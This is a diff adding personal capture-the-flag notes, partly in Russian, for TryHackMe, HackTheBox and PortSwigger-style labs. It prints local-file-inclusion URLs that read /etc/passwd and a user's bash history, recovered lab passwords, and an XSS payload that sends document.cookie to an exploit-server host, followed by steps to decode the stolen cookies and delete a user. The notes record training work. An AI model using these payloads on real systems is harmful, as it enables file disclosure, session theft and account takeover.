@@ -165,8 +165,49 @@ Hijack thm
 27. sudo -l 
 28. и дальше через поисковик нашел уязвимость gcc, пересборка библиотеки и получение root
 
+============================================================================================================
+
+Usage htb
+
+1. Done simple scan of directories and ports
+2. Found registration page
+3. Found hidden token on the page 'Vn84QFPqnnxZ66KTuvu5ENm2Bq9lajdWCfnp9W7r'
+4. Try use it with burp
+
+==============================================================================================================
+
+Red thm
+
+1. Simple scan port and dir
+2. found http://10.10.89.175/index.php?page= #This is potential LFE!!!
+3. http://10.10.89.175/index.php?page=../../../../../../../../../etc/passwd - # didn't help me
+4. http://10.10.89.175/index.php?page=php://filter/resource=/etc/passwd = # work
+5. next http://10.10.89.175/index.php?page=php://filter/resource=/home/blue/.bash_history 
+# and got answer
+echo "Red rules" 
+cd 
+hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt 
+cat passlist.txt 
+rm passlist.txt 
+sudo apt-get remove hashcat -y
+6. http://10.10.89.175/index.php?page=php://filter/resource=/home/blue/.bash_history/.reminder ---> sup3r_p@s$w0rd! 
+7. blue:sup3r_p@s$w0rd! 
 
 
 
+===========================================================================================
 
+Lab: Offline password cracking
 
+1. В этой лабе клиент хранит все сессионные куки (т.е сам сайт), а также сайт уязвим к XSS
+2. Зарегаемся по известными кредами weiner:peter
+3. Зайдем в блог, загрузим payload 
+
+<script>newImage().src="https://exploit-0a4d00df03b8a142833f4b0e016600b4.exploit-server.net/exploit"+document.cookie;</script>
+
+где скрипт создает новый объект Image и источник на указанном уязвимом(контролируемом) урле, который показывает при запросе все сессионные куки.
+4. идем в логи, (если отдельная тачка то /var/log/apache2/access.log), здесь просто в логи уязвимого сервера и смотрим наши сессионные куки
+5. Находим куки для carlos. декодим с base64 и md5, получаем carlos:onceuponatime
+6. Удаляем carlos
+
+============================================================================================
